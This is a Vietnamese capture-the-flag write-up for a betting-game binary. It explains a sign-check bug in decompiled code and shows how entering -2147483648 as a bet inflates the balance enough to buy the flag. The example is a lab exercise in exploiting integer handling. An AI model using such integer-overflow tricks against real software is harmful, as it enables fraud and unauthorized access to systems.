# Bet To Win
## Đây là một challenge các anh cho để lấy điểm, chủ yếu là debug để exploit

# Undertand
Bài theo dạng menu, sẽ in ra 2 lựa chọn cho người chơi, kèm theo số tiền ban đầu và số lượt đặt cược tối đa.
```sh
zir@HAZIR:~/anhtoictf$ ./luckynumber 
Welcom To Lucky Game 
You Have 1000$ And 5 Turn To Play 
1.Play Game 
2.Buy Flag 
>
```

Nếu người chơi đặt cược hợp lệ và dự đoán 1 con số chính xác thì số tiền đặt cược đúng sẽ cộng vào số tiền hiện tại, ngược lại sẽ mất số tiền đặt cược.
Trong hàm play() có sử dụng 2 khối if để check điều kiện hợp lệ khi chơi

```sh
if ( (abs32(v3) & 0x80000000) != 0 && abs32(v3) > money )
    {
      money -= v3;
      menu();
    }
if ( (abs32(v3) & 0x80000000) != 0 || abs32(v3) > money )
    {
      puts("You Dont Have Enough Money ");
      menu();
    }
```

Khối if đầu tiên có lỗi, số tiền sẽ được trừ khi người chơi chưa thua vào bị mất tiền.
Mình sẽ nhập 0x80000000 để thỏa điều kiện if thứ 1 và tất nhiên nó lớn hơn money, số tiền sẽ trừ cho 0x80000000

```sh
pwndbg> p/d 0x80000000
$1 = -2147483648

```
Đây là điều mình cần, money -= v3 , cái chúng ta nhập là âm (-) ---> money +=v3


# Solution

Chúng ta chỉ cần làm khối if thứ 1 thỏa điều kiện thì sẽ được 1 số tiền khá lớn, đủ lớn để mua được flag cho challenge này
```sh
if ( (unsigned int)money > 50000 )
  {
    system("cat flag.txt");
    exit(0);
  }
```

# Exploit

```sh
zir@HAZIR:~/anhtoictf$ ./luckynumber 
Welcom To Lucky Game 
You Have 1000$ And 5 Turn To Play 
1.Play Game 
2.Buy Flag 
> 1                  
Give Me Your Bet Money :-2147483648
Welcom To Lucky Game 
You Have 2147484648$ And 4 Turn To Play 
1.Play Game 
2.Buy Flag 
> 

```

tada!!! Đã đủ tiền mua flag, chỉ cần lên server và lấy flag thôi! :3